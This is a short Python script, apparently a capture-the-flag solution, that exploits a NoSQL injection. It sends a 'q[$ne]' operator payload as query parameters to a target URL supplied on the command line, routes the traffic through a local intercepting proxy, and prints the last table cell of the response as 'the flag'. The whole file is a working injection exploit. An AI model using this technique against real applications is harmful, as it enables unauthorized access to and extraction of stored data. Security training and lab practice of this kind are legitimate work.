import requests
import sys
from bs4 import BeautifulSoup #Parsing de HTML

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = f"{sys.argv[1]}/"

data = {
	'q[$ne]': 'sjxjsakbxjsak@teste.com'
}

response = requests.get(url, params=data, headers=headers, proxies=proxies)
html_response = response.text # Salva a response em uma variável
soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
results_tag = soup.find_all("td") # Filtra por todas as tag HTML "td"
string = results_tag[-1] # Obtem o ultimo valor do array
print(string.get_text()) # Printa somente a flag sem as tags html <td>